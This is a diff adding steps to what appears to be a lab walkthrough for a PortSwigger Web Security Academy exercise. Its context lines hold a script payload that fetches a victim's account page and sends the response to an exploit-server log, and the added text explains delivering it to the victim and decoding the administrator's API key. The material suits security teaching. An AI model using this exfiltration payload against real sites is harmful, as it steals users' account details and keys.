@@ -242,6 +242,11 @@ fetch('https://0a6e004204f74b30c142e98100f9006b.web-security-academy.net/account
 .then((response) => document.location='https://exploit-0aa600e7048e4bcac12de85a010500dd.exploit-server.net/log?x='+response);</script>
 
 ```
+Once the explit is stored (1) we can verify if it works (2). As shown below we can see that the redirection to exploit server access log works and that the account details are trasmitted into the query string
+-- 62 --
+Then we can delivery our payload to the victim and inspecting the access log we can see the account details (URL encoded) for the administrator user
+-- 63 --
+Decode the query string parameter value to get the API key
 
 
 References:
